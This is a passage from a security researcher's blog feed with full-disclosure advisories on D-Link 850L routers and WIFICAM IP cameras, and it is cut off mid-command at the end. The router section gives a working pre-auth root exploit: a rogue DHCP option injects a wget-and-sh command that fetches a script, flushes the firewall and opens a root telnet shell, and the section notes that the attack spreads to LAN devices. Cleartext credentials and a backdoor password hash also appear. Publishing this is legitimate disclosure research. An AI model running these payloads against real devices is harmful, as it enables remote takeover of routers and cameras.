dDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKP9G2XKXNzaXPPWIjXD
/pD8YSwhi5mF0eKxy7diNQW55F1h5DGNVJn6vRQMwWErz2BBhEeIGKuOu8r6ecDv
ewlKE0iR2yQz56fURI+sC3DJBu0fToPP1rkN4bKHsT7uGJIyVz4bUOmJFe7HhA4D
9wtkzagpx3V86krO/r09e3IcLvMGro/1TFWdhUR1OtyUPQxuj6nLnR01vk/ylZ5l
l0J7KYK/GTIV6GxE7XarUT7cWwPJhGXhfPnCKAPVXKj9Pf1TAW0ZvqOfkOIY7b0q
7/ltmxHfgQ1PleOWV/GXz6BFmI0KiJL+2jBAkyF9nm4CrIwitz32FF+T2G1VlFft
e+sCAwEAAaN7MHkwCQYDVR0TBAIwADAsBglghkgBhvhCAQ0EHxYdT3BlblNTTCBH
ZW5lcmF0ZWQgQ2VydGlmaWNhdGUwHQYDVR0OBBYEFLW/0aXWbyCwiR+mwVgFMbKz
0MEBMB8GA1UdIwQYMBaAFF346bXxV6SQlLuf2/eRleccoufSMA0GCSqGSIb3DQEB
BQUAA4IBAQA9CSLQpn2czb1brWLCaikS0WGIyh5oHQTdQPup058iSdz6+zwh3UWl
UxqbgO5QFqY2OjzwOSfkjXAgA3N/JmWsqwWxhO58FkPKL7VrRPx1oceGBBi037J2
84j73OyZPf7RfOr6VusL1WmESD0S29Hv+YmwYnDsvt3m792Iz/Tl/x2I1eAj8Luj
346KBerz3BRJLUZKJ0Cm/HBK9ZQ/lGTRk3sDEnVnMO6MB+FzdwAj1mggB3+PTh3o
docNTCb2VoTiVpigbK1xISOkpju5jicTwq5wD2rGvriImgrXADk6kH5fTSKITqaK
L0K03Bik6/rxBA6n4v9drM1hKAF+0wET
-----END CERTIFICATE-----
</code></pre>
<p><a id="dns"></a></p>
<h2>Details - WAN &amp;&amp; LAN - revA - Nonce bruteforcing for DNS configuration</h2>
<p>The file <code>htdocs/parentalcontrols/bind.php</code> allows to change DNS configuration.
It doesn't check authentication of the admin user.</p>
<p>An attacker can bruteforce the nonce (<code>?nonce=integer</code>). There are no limitations of HTTP requests and no authentication method:</p>
<pre><code>  8 $uptime_limit = query(INF_getinfpath($WAN1)."/open_dns/nonce_uptime") + 1800;
  9 if(query(INF_getinfpath($WAN1)."/open_dns/nonce")!=$_GET["nonce"] || $_GET["nonce"]=="")
 10 {
 11         $Response="BindError";
 12 }
 13 else if(query("/runtime/device/uptime") &gt; $uptime_limit)
 14 {
 15         $Response="BindTimeout";
 16 }
</code></pre>
<p>The attacker can then define new DNS servers:</p>
<pre><code> 21         set(INF_getinfpath($WAN1)."/open_dns/deviceid", $_GET["deviceid"]);
 22         set(INF_getinfpath($WAN1)."/open_dns/parent_dns_srv/dns1", $_GET["dnsip1"]);
 23         set(INF_getinfpath($WAN1)."/open_dns/parent_dns_srv/dns2", $_GET["dnsip2"]);
</code></pre>
<p>An attacker can use this vuln to forward traffic to server he/she controls (i.e.: custom Dlink Cloud servers, to take control over the dlink router).</p>
<p><a id="cleartext-passwords"></a></p>
<h2>Details - Local - revA and revB - Weak files permission and credentials stored in cleartext</h2>
<p>It appears some files have weak permissions:</p>
<p>&nbsp;&nbsp;&nbsp;1. <code>/var/passwd</code></p>
<p><code>/var/passwd</code> contains credentials in cleartext.</p>
<p>The permissions of <code>/var/passwd</code> are: -rw-rw-rw- (666)</p>
<pre><code># ls -la /var/passwd
-rw-rw-rw-    1 root     root           28 Jan  1 00:00 /var/passwd
# cat /var/passwd
"Admin" "password" "0"
</code></pre>
<p>&nbsp;&nbsp;&nbsp;2. <code>/var/etc/hnapasswd</code></p>
<p>Note that an attacker can use /var/etc/hnapasswd to retrieve the password in cleartext too:</p>
<pre><code># cat /var/etc/hnapasswd
Admin:password
</code></pre>
<p>The permissions of <code>/var/etc/hnapasswd</code> are: -rw-rw-rw- (666)</p>
<pre><code># ls -la /var/etc/hnapasswd
-rw-rw-rw-    1 root     root           20 Jan  1 00:00 /var/etc/hnapasswd
</code></pre>
<p>&nbsp;&nbsp;&nbsp;3. <code>/etc/shadow</code></p>
<p><code>/etc/shadow</code> is a symlink to <code>/var/etc/passwd</code>. The file <code>/var/etc/passwd</code> is world-readable, as shown below:</p>
<pre><code># ls -al /etc/shadow 
lrwxrwxrwx    1 root     root           15 Jan 20  2017 /etc/shadow -&gt; /var/etc/shadow
# ls -la /var/etc/shadow
-rw-r--r--    1 root     root           93 Jan  1 00:00 /var/etc/shadow
</code></pre>
<p>This file contains a DES hash of the admin user.</p>
<pre><code># cat /var/etc/shadow
root:!:10956:0:99999:7:::
nobody:!:10956:0:99999:7:::
Admin:zVc1PPVw2VWMc:10956:0:99999:7:::
</code></pre>
<p>&nbsp;&nbsp;&nbsp;4. <code>/var/run/storage_account_root</code></p>
<p><code>/var/run/storage_account_root</code> contains credentials in cleartext.</p>
<p>The permissions of <code>/var/passwd</code> are: -rw-rw-rw- (666)</p>
<pre><code># ls -la /var/run/storage_account_root
-rw-rw-rw-    1 root     root           40 Jan  1 00:00 /var/run/storage_account_root
# cat /var/run/storage_account_root
admin:password,:::
jean-claude:dusse,:::
</code></pre>
<p>&nbsp;&nbsp;&nbsp;5. <code>/var/run/hostapd*</code></p>
<p>The files <code>/var/run/hostapd*</code> contain the wireless passphrase in cleartext.</p>
<p>The permissions of these files are: -rw-rw-rw- (666)</p>
<pre><code># ls -la /var/run/hostapd*
-rw-rw-rw-    1 root     root           73 Jan  1 00:00 /var/run/hostapd-wlan1wps.eap_user
-rw-rw-rw-    1 root     root         1160 Jan  1 00:00 /var/run/hostapd-wlan1.conf
-rw-rw-rw-    1 root     root           73 Jan  1 00:00 /var/run/hostapd-wlan0wps.eap_user
-rw-rw-rw-    1 root     root         1170 Jan  1 00:00 /var/run/hostapd-wlan0.conf
# cat /var/run/hostapd*|grep -i pass
wpa_passphrase=aaaaa00000
wpa_passphrase=aaaaa00000
</code></pre>
<p><a id="pre-auth-root-rces"></a></p>
<h2>Details - WAN - revB - Pre-Auth RCEs as root (L2)</h2>
<p>The DHCP client running on the router is vulnerable to <u>several</u> command injections as root.</p>
<p>Please use the dhcpd.conf file provided:</p>
<pre><code>rasp-pwn-dlink# cat /etc/dhcp/dhcpd.conf
option domain-name ";wget -O /var/re http://10.254.239.1/dhcp-rce ; sh /var/re;";
option domain-name-servers 8.8.8.8, 8.8.4.4;
default-lease-time 600;
max-lease-time 7200;
ddns-update-style none;
subnet 10.254.239.0 netmask 255.255.255.224 {
  range 10.254.239.10 10.254.239.20;
  option routers 10.254.239.1;
}
rasp-pwn-dlink# ifconfig eth1
eth1      Link encap:Ethernet  HWaddr 00:0e:c6:aa:aa:aa  
          inet addr:10.254.239.1  Bcast:10.254.239.255  Mask:255.255.255.0
          inet6 addr: fe80::20e:caaa:aaaa:aaa/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:129 errors:0 dropped:0 overruns:0 frame:0
          TX packets:107 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:11181 (10.9 KiB)  TX bytes:49155 (48.0 KiB)

rasp-pwn-dlink# cat /var/www/html/dhcp-rce 
#!/bin/sh

wget -O /var/telnetd-dhcpd-wan http://10.254.239.1/dlink-telnetd
chmod 777 /var/telnetd-dhcpd-wan
(for i in 0 1 2 3; do # win races against legit iptables rules
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
sleep 10
done ) &amp;

/var/telnetd-dhcpd-wan -l /bin/sh -p 110 &amp;

rasp-pwn-dlink# dhcpd eth1
Internet Systems Consortium DHCP Server 4.3.1
Copyright 2004-2014 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/
Config file: /etc/dhcp/dhcpd.conf
Database file: /var/lib/dhcp/dhcpd.leases
PID file: /var/run/dhcpd.pid
Wrote 1 leases to leases file.
Listening on LPF/eth1/00:0e:c6:aa:aa:aa/10.254.239.0/27
Sending on   LPF/eth1/00:0e:c6:aa:aa:aa/10.254.239.0/27
Sending on   Socket/fallback/fallback-net
rasp-pwn-dlink#
</code></pre>
<p>When doing a DHCP request at startup, the router connects from the WAN the remote HTTP server:</p>
<pre><code>rasp-pwn-dlink# tail -f /var/log/nginx/access.log
10.254.239.10 - - [03/Jul/2017:15:40:30 +0000] "GET /dhcp-rce HTTP/1.1" 200 383 "-" "Wget"
10.254.239.10 - - [03/Jul/2017:15:40:30 +0000] "GET /dlink-telnetd HTTP/1.1" 200 10520 "-" "Wget"
10.254.239.10 - - [03/Jul/2017:15:40:30 +0000] "GET /dhcp-rce HTTP/1.1" 200 383 "-" "Wget"
10.254.239.10 - - [03/Jul/2017:15:40:30 +0000] "GET /dlink-telnetd HTTP/1.1" 200 10520 "-" "Wget"
</code></pre>
<p>And now we got a telnetd from the WAN:</p>
<pre><code>rasp-pwn-dlink# telnet 10.254.239.10 110
Trying 10.254.239.10...
Connected to 10.254.239.10.
Escape character is '^]'.


BusyBox v1.14.1 (2017-01-20 14:35:27 CST) built-in shell (msh)
Enter 'help' for a list of built-in commands.

# uname -ap
Linux dlinkrouter 2.6.30.9 #1 Fri Jan 20 14:12:50 CST 2017 rlx GNU/Linux
# cd /var
# ls -la
drwxr-xr-x    5 root     root            0 Jan  1 00:00 etc
drwxr-xr-x    2 root     root            0 Jan  1  1970 log
drwxr-xr-x    3 root     root            0 Jan  1 00:00 run
drwxr-xr-x    2 root     root            0 Jan  1  1970 sealpac
drwxr-xr-x    4 root     root            0 Jan  1 00:00 tmp
drwxr-xr-x    2 root     root            0 Jan  1  1970 dnrd
drwxr-xr-x    4 root     root            0 Jan  1  1970 htdocs
-rw-r--r--    1 root     root           10 Jan  1  1970 TZ
drwxr-xr-x    2 root     root            0 Jan  1 00:00 servd
-rw-r--r--    1 root     root         5588 Jan  1  1970 default_wifi.xml
-rw-rw-rw-    1 root     root           28 Jan  1 00:00 passwd
drwxrwx---    2 root     root            0 Jan  1 00:00 session
srwxr-xr-x    1 root     root            0 Jan  1 00:00 gpio_ctrl
-rw-r--r--    1 root     root            2 Jan  1 00:00 sys_op
drwxr-xr-x    2 root     root            0 Jan  1 00:00 home
lrwxrwxrwx    1 root     root           16 Jan  1 00:00 portal_share -&gt; /var/tmp/storage
drwxr-xr-x    3 root     root            0 Jan  1 00:00 proc
-rwxr-xr-x    1 root     root          856 Jan  1 00:00 killrc0
drwxr-xr-x    2 root     root            0 Jan  1 00:00 porttrigger
-rw-r--r--    1 root     root          383 Jan  1 00:00 re
-rwxrwxrwx    1 root     root        10520 Jan  1 00:00 telnetd-dhcpd-wan
-rw-rw-rw-    1 root     root          301 Jan  1 00:00 rendezvous.conf
-rw-rw-rw-    1 root     root          523 Jan  1 00:00 stunnel.conf
-rw-rw-rw-    1 root     root          282 Jan  1 00:00 topology.conf
-rw-rw-rw-    1 root     root          394 Jan  1 00:00 lld2d.conf
-rw-r--r--    1 root     root          199 Jan  1 00:00 hosts
drwxr-xr-x   16 root     root          241 Jan 20  2017 ..
drwxr-xr-x   14 root     root            0 Jan  1 00:00 .
# cat re
#!/bin/sh

wget -O /var/telnetd-dhcpd-wan http://10.254.239.1/dlink-telnetd
chmod 777 /var/telnetd-dhcpd-wan
(for i in 0 1 2 3; do # win races against legit iptables rules
iptables -F        
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
sleep 10 
done ) &amp;
/var/telnetd-dhcpd-wan -l /bin/sh -p 110 &amp;

#
</code></pre>
<p>This telnetd access is reachable from the WAN and the LAN.</p>
<h3>Analysis of the vulnerabilities</h3>
<p>There are several WAN RCEs. The first problem is located here:</p>
<p><code>/etc/services/INET/inet_ipv4.php</code></p>
<pre><code> 94         $udhcpc_helper  = "/var/servd/".$inf."-udhcpc.sh";
</code></pre>
<p>And you have command injections everywhere starting line 101.</p>
<pre><code> 99     fwrite(w,$udhcpc_helper, 
100                 '#!/bin/sh\n'.
101                 'echo [$0]: $1 $interface $ip $subnet $router $lease $domain $scope $winstype $wins $sixrd_prefix $sixrd_prefixlen $sixrd_msklen $sixrd_bripaddr ... &gt; /dev/console\n'.
102                 'phpsh '.$hlper.' ACTION=$1'.
103                         ' INF='.$inf.
104                         ' INET='.$inet.
105                         ' MTU='.$mtu.
106                         ' INTERFACE=$interface'.
107                         ' IP=$ip'.
108                         ' SUBNET=$subnet'.
109                         ' BROADCAST=$broadcast'.
110                         ' LEASE=$lease'.
111                         ' "DOMAIN=$domain"'.
112                         ' "ROUTER=$router"'.
113                         ' "DNS='.$dns.'$dns"'.
114                         ' "CLSSTROUT=$clsstrout"'.
115                         ' "MSCLSSTROUT=$msclsstrout"'.
116                         ' "SSTROUT=$sstrout"'.
117                         ' "SCOPE=$scope"'.
118                         ' "WINSTYPE=$winstype"'.
119                         ' "WINS=$wins"'.
120                         ' "SIXRDPFX=$sixrd_prefix"'.
121                         ' "SIXRDPLEN=$sixrd_prefixlen"'.
122                         ' "SIXRDMSKLEN=$sixrd_msklen"'.
123                         ' "SIXRDBRIP=$sixrd_bripaddr"'.
124                         ' "SDEST=$sdest"'.
125                         ' "SSUBNET=$ssubnet"'.
126                         ' "SROUTER=$srouter"\n'.
127                 'exit 0\n'
128                 );
</code></pre>
<p>As you can see, variables are not sanitized. One solution is also to inject commands using the <code>/var/servd/$VAR-udhcpc.sh</code> script with <code>$domain</code> (<code>option domain-name</code> in isc-dhcp).</p>
<p>The <code>WAN-1-udhcpc.sh</code> file will be generated and called by <code>udhcpc</code> (<code>udhcpc -i eth1 -H dlinkrouter -p /var/servd/WAN-1-udhcpc.pid -s /var/servd/WAN-1-udhcpc.sh</code>)</p>
<pre><code># cat WAN-1-udhcpc.sh
#!/bin/sh
echo [$0]: $1 $interface $ip $subnet $router $lease $domain $scope $winstype $wins $sixrd_prefix $sixrd_prefixlen $sixrd_msklen $sixrd_bripaddr ... &gt; /dev/console
phpsh /etc/services/INET/inet4_dhcpc_helper.php ACTION=$1 INF=WAN-1 INET=INET-3 MTU=1500 INTERFACE=$interface IP=$ip SUBNET=$subnet BROADCAST=$broadcast LEASE=$lease "DOMAIN=$domain" "ROUTER=$router" "DNS=$dns" "CLSSTROUT=$clsstrout" "MSCLSSTROUT=$msclsstrout" "SSTROUT=$sstrout" "SCOPE=$scope" "WINSTYPE=$winstype" "WINS=$wins" "SIXRDPFX=$sixrd_prefix" "SIXRDPLEN=$sixrd_prefixlen" "SIXRDMSKLEN=$sixrd_msklen" "SIXRDBRIP=$sixrd_bripaddr" "SDEST=$sdest" "SSUBNET=$ssubnet" "SROUTER=$srouter"
exit 0
</code></pre>
<p>So using this DNS configuration will work against the router:</p>
<pre><code>option domain-name "`wget -O /var/re http://10.254.239.1/dhcp-rce ; sh /var/re;`";
</code></pre>
<p>In the logs, we confirm the execution:</p>
<pre><code>rasp-pwn-dlink# tail -f /var/log/nginx/access.log
10.254.239.10 - - [03/Jul/2017:15:42:31 +0000] "GET /dhcp-rce HTTP/1.1" 200 383 "-" "Wget"
10.254.239.10 - - [03/Jul/2017:15:42:31 +0000] "GET /dlink-telnetd HTTP/1.1" 200 10520 "-" "Wget"
</code></pre>
<p>Note that you also have command injections inside some generated files (in <code>/var/servd/</code>) using the <code>;wget -O /var/re http://10.254.239.1/dhcp-rce ; sh /var/re;</code> payload:</p>
<pre><code># cat /var/servd/DHCPS4.LAN-1_start.sh
#!/bin/sh
rm -f /var/servd/LAN-1-udhcpd.lease
xmldbc -X /runtime/inf:1/dhcps4/leases
xmldbc -s /runtime/inf:1/dhcps4/pool/start 192.168.0.100
xmldbc -s /runtime/inf:1/dhcps4/pool/end 192.168.0.199
xmldbc -s /runtime/inf:1/dhcps4/pool/leasetime 604800
xmldbc -s /runtime/inf:1/dhcps4/pool/network 192.168.0.1
xmldbc -s /runtime/inf:1/dhcps4/pool/mask 24
xmldbc -s /runtime/inf:1/dhcps4/pool/domain ;wget -O /var/re http://10.254.239.1/dhcp-rce ; sh /var/re; &lt;--- command injection
xmldbc -s /runtime/inf:1/dhcps4/pool/router 192.168.0.1
event UPDATELEASES.LAN-1 add "@/etc/events/UPDATELEASES.sh LAN-1 /var/servd/LAN-1-udhcpd.lease"
udhcpd /var/servd/LAN-1-udhcpd.conf &amp;
exit 0
exit 0
#

# cat /var/servd/DHCPS4.LAN-2_start.sh
#!/bin/sh
rm -f /var/servd/LAN-2-udhcpd.lease
xmldbc -X /runtime/inf:2/dhcps4/leases
xmldbc -s /runtime/inf:2/dhcps4/pool/start 192.168.7.100
xmldbc -s /runtime/inf:2/dhcps4/pool/end 192.168.7.199
xmldbc -s /runtime/inf:2/dhcps4/pool/leasetime 604800
xmldbc -s /runtime/inf:2/dhcps4/pool/network 192.168.7.1
xmldbc -s /runtime/inf:2/dhcps4/pool/mask 24
xmldbc -s /runtime/inf:2/dhcps4/pool/domain ;wget -O /var/re http://10.254.239.1/dhcp-rce ; sh /var/re; &lt;--- command injection
xmldbc -s /runtime/inf:2/dhcps4/pool/router 192.168.7.1
event UPDATELEASES.LAN-2 add "@/etc/events/UPDATELEASES.sh LAN-2 /var/servd/LAN-2-udhcpd.lease"
udhcpd /var/servd/LAN-2-udhcpd.conf &amp;
exit 0
exit 0
#
</code></pre>
<p><strong>Bonus point:</strong> this attack will be relayed to internal clients using the dhcp server running inside the router.
So if you connect a vulnerable Dlink router to the internal network, it will be pwned too:</p>
<pre><code># ps -w|grep dhcpd
 6543 root       984 S    udhcpd /var/servd/LAN-1-udhcpd.conf 
 6595 root       984 S    udhcpd /var/servd/LAN-2-udhcpd.conf
</code></pre>
<p>The <code>/runtime/inf:{1,2}/dhcps4/pool/domain</code> entries in the <code>/var/servd/LAN-{1,2}-udhcpd.conf</code> files contain the rogue domain value:</p>
<pre><code># cat /var/servd/LAN-1-udhcpd.conf
remaining no
start 192.168.0.100
end 192.168.0.199
interface br0
lease_file /var/servd/LAN-1-udhcpd.lease
pidfile /var/servd/LAN-1-udhcpd.pid
force_bcast no
opt subnet 255.255.255.0
opt domain ;wget -O /var/re http://10.254.239.1/dhcp-rce ; sh /var/re;

^^^^^^^^^^^^ this domain will be provided to clients connected on the LAN,
             possibly infecting other dlink routers \o/

opt router 192.168.0.1
opt dns 192.168.0.1
opt lease 604800
dhcp_helper event UPDATELEASES.LAN-1
# cat /var/servd/LAN-2-udhcpd.conf
remaining no
start 192.168.7.100
end 192.168.7.199
interface br1
lease_file /var/servd/LAN-2-udhcpd.lease
pidfile /var/servd/LAN-2-udhcpd.pid
force_bcast no
opt subnet 255.255.255.0
opt domain ;wget -O /var/re http://10.254.239.1/dhcp-rce ; sh /var/re

^^^^^^^^^^^^ this domain will be provided to clients connected on the LAN,
             possibly infecting other dlink routers \o/

opt router 192.168.7.1
opt dns 192.168.7.1
opt lease 604800
dhcp_helper event UPDATELEASES.LAN-2
#
</code></pre>
<p><a id="dos"></a></p>
<h2>Details - LAN - revA and revB - DoS against some daemons</h2>
<p>It appears some daemons running in the routers (revA and revB) can be crashed remotely from the LAN.
As it doesn't provide further remote privileges to an attacker, this is only for information and was not detailed.</p>
<h2>Vendor Response</h2>
<p>Due to <a href="http://pierrekim.github.io/blog/2017-02-02-update-dlink-dwr-932b-lte-routers-vulnerabilities.html">difficulties in previous exchange with Dlink</a>, <strong>Full-disclosure is applied</strong>.
Their previous lack of consideration about security made me publish this research without coordinated disclosure.</p>
<p><strong>I advise to IMMEDIATELY DISCONNECT vulnerable routers from the Internet.</strong></p>
<h2>Report Timeline</h2>
<ul>
<li>Jun 15, 2017: Vulnerabilities found.</li>
<li>Jul 03, 2017: This advisory is written.</li>
<li>Sep 08, 2017: A public advisory is sent to security mailing lists.</li>
<li>Sep 13, 2017: MITRE provides CVE-2017-14413, CVE-2017-14414, CVE-2017-14415, CVE-2017-14416, CVE-2017-14417, CVE-2017-14418, CVE-2017-14419, CVE-2017-14420, CVE-2017-14421, CVE-2017-14422, CVE-2017-14423, CVE-2017-14424, CVE-2017-14425, CVE-2017-14426, CVE-2017-14427, CVE-2017-14428, CVE-2017-14429, CVE-2017-14430.</li>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>Greetings</h2>
<p>Big thanks to Alexandre Torres.</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html">https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html</a></p>
<p><a href="https://pierrekim.github.io/advisories/2017-dlink-0x00-dlink-850l-cloud.txt">https://pierrekim.github.io/advisories/2017-dlink-0x00-dlink-850l-cloud.txt</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>Zer0con slides - Owning embedded devices and network protocols</title>
        <link href="2017-09-07-zer0con-2017-slides.html"/>
        <content type="html"><p>My presentation slides about <b>Owning embedded devices and network protocols</b> at Zer0con in April 2017, are finally online! Some parts had to be redacted. It appears a lot of 0day vulnerabilities have not been patched yet.</p>
<p><a href="https://pierrekim.github.io/advisories/z0-Owning_embedded_devices_and_network_protocols-redacted.pdf">You can fetch the slides here</a>.</p>
<p><b>Update about the last slide:</b> KT, a Korean ISP, was present during the zer0con presentation and provided patches against security problems I had reported.</p>
<p>This research is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>Multiple vulnerabilities found in Wireless IP Camera (P2P) WIFICAM cameras and vulnerabilities in custom http server</title>
        <link href="2017-03-08-camera-goahead-0day.html"/>
        <content type="html"><p><strong>TL;DR: by analysing the security of a camera, I found a pre-auth RCE as root against 1250 camera models. Shodan lists 185 000 vulnerable cameras. The "Cloud" protocol establishes clear-text UDP tunnels (in order to bypass NAT and firewalls) between an attacker and cameras by using only the serial number of the targeted camera. Then, the attacker can automaticaly bruteforce the credentials of cameras.</strong></p>
<h2>Product Description</h2>
<p>The Wireless IP Camera (P2P) WIFICAM is a Chinese web camera which allows to stream remotely. </p>
<p><img alt="" src="images/2017-icam.jpg" /></p>
<h2>Vulnerabilities Summary</h2>
<p>The Wireless IP Camera (P2) WIFICAM is a camera overall badly designed with a lot of vulnerabilities.
This camera is very similar to a lot of other Chinese cameras.</p>
<p>It seems that a generic camera is being sold by a Chinese company in bulk (OEM) and
the buyer companies resell them with custom software development and specific branding. Wireless IP Camera (P2) WIFICAM is one of the branded cameras.</p>
<p>So, cameras are sold under different names, brands and functions. The HTTP
interface is different for each vendor but shares the same vulnerabilities.
The OEM vendors used a custom version of GoAhead and added vulnerable code inside.</p>
<p>GoAhead stated that GoAhead itself is not affected by the vulnerabilities but the OEM vendor who did the custom and 
specific development around GoAhead is responsible for the cause of vulnerabilities.</p>
<p>Because of code reusing, the vulnerabilities are present in a huge list of cameras (especially the InfoLeak and the RCE),
<strong>which allow to execute root commands against 1250+ camera models with a pre-auth vulnerability</strong>.</p>
<p>The summary of the vulnerabilities is:</p>
<ol>
<li><a href="#backdoor-account">CVE-2017-8224 - Backdoor account</a></li>
<li><a href="#rsa-lulz">CVE-2017-8222 - RSA key and certificates</a></li>
<li><a href="#pre-auth-info-leak-goahead">CVE-2017-8225 - Pre-Auth Info Leak (credentials) within the custom http server</a></li>
<li><a href="#root-rce">Authenticated RCE as root</a></li>
<li><a href="#pre-auth-root-rce">Pre-Auth RCE as root</a></li>
<li><a href="#open-streaming">CVE-2017-8223 - Misc - Streaming without authentication</a></li>
<li><a href="#cloud">CVE-2017-8221 - Misc - "Cloud" (Aka Botnet)</a></li>
</ol>
<p><strong>The vulnerabilities in the Cloud management affect a lot of P2P or "Cloud" cameras.</strong></p>
<p><strong>My tests have shown that the InfoLeak affecting the custom http server running on the camera affects at least 1250+ camera models. It can be used to execute the RCE as root.
Thus, these cameras are likely affected by a pre-auth RCE as root:</strong></p>
<pre><code>Update (Mar 16, 2017): Following the strong requests from a specific vendor,
the complete list of 1250 affected camera models has been removed.
</code></pre>
<p><a href="https://www.shodan.io/search?query=GoAhead+5ccc069c403ebaf9f0171e9517f40e41">Shodan lists 185 000 vulnerable cameras</a>.</p>
<p><a id="backdoor-account"></a></p>
<h2>Details - CVE-2017-8224 - Backdoor account</h2>
<p>By default, telnetd is running on the camera.</p>
<pre><code>user@kali$ telnet 192.168.1.107
Trying 192.168.1.107...
Connected to 192.168.1.107.
Escape character is '^]'.

apk-link login: admin
Password:

telnet&gt; q
Connection closed.
user@kali$
</code></pre>
<p>One backdoor account exists in the camera:</p>
<pre><code>root:$1$ybdHbPDn$ii9aEIFNiolBbM9QxW9mr0:0:0::/root:/bin/sh
</code></pre>
<p><a id="rsa-lulz"></a></p>
<h2>Details - CVE-2017-8222 - RSA key and certificates</h2>
<p>The <code>/system/www/pem/ck.pem</code> contains an Apple certificate with a private RSA key:</p>
<pre><code>/ # cat /system/www/pem/ck.pem 
Bag Attributes
    friendlyName: Apple Production IOS Push Services: com.app.camera
    localKeyID: 74 9E 29 D0 6A 47 1B 35 AD D4 68 6D 46 D8 E2 37 C8 DA A1 9D 
subject=/UID=com.app.camera/CN=Apple Production IOS Push Services: com.app.camera/OU=SQ6NNPBE2K/C=US
issuer=/C=US/O=Apple Inc./OU=Apple Worldwide Developer Relations/CN=Apple Worldwide Developer Relations Certification Authority
-----BEGIN CERTIFICATE-----
[...]
-----END CERTIFICATE-----
Bag Attributes
    friendlyName: andrew
    localKeyID: 74 9E 29 D0 6A 47 1B 35 AD D4 68 6D 46 D8 E2 37 C8 DA A1 9D 
Key Attributes: &lt;No Attributes&gt;
-----BEGIN RSA PRIVATE KEY-----
[...]
-----END RSA PRIVATE KEY-----
</code></pre>
<p><a id="pre-auth-info-leak-goahead"></a></p>
<h2>Details - CVE-2017-8225 - Pre-Auth Info Leak (credentials) within the custom http server</h2>
<p>The HTTP interface is provided by a custom http server. This HTTP server is in fact based on GoAhead and
was modified by the OEM vendor of the cameras (which resulted in the listed vulnerabilities).
It allows 2 kinds of authentication:</p>
<ul>
<li>htdigest authentication OR</li>
<li>authentication using credentials in URI (<code>?loginuse=LOGIN&amp;?loginpas=PASS</code>).</li>
</ul>
<p>By default, the web directory contains symbolic links to configuration files (<code>system.ini</code> and <code>system-b.ini</code> contain credentials):</p>
<pre><code>/tmp/web # ls -la *ini
lrwxrwxrwx    1 root     0               25 Oct 27 02:11 factory.ini -&gt; /system/param/factory.ini
lrwxrwxrwx    1 root     0               30 Oct 27 02:11 factoryparam.ini -&gt; /system/param/factoryparam.ini
lrwxrwxrwx    1 root     0               23 Oct 27 02:11 network-b.ini -&gt; /system/www/network.ini
lrwxrwxrwx    1 root     0               23 Oct 27 02:11 network.ini -&gt; /system/www/network.ini
lrwxrwxrwx    1 root     0               22 Oct 27 02:11 system-b.ini -&gt; /system/www/system.ini
lrwxrwxrwx    1 root     0               22 Oct 27 02:11 system.ini -&gt; /system/www/system.ini
/tmp/web #
</code></pre>
<p>With valid credentials, an attacker can retrieve the configuration, as shown below:</p>
<pre><code>user@kali$ wget -qO- 'http://admin:admin@192.168.1.107/system.ini'|xxd

[...]
000001d0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000001e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000001f0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000200: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000210: ffff ffff ffff ffff ffff ffff 7b6f 1158  ............{o.X
00000220: 0000 0000 0100 0000 7469 6d65 2e6e 6973  ........time.nis
00000230: 742e 676f 7600 0000 0000 0000 0000 0000  t.gov...........
00000240: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000250: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000260: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000270: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000280: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000290: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000002a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000002b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000002c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
[...]
00000640: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000650: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000660: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000670: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000680: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000690: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........
000006a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000006b0: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........
000006c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000006d0: 030a 0a0f 8000 0000 0101 0003 0002 0000  ................
[...]
user@kali$
</code></pre>
<p>To browse <code>.cgi</code> files, an attacker needs to authenticate too:</p>
<pre><code>user@kali$ wget -qO- 'http://192.168.1.107/get_params.cgi?loginuse=BAD_LOGIN&amp;loginpas=BAD_PASS'
var result="Auth Failed";
user@kali$ wget -qO- 'http://192.168.1.107/get_params.cgi?loginuse&amp;loginpas'
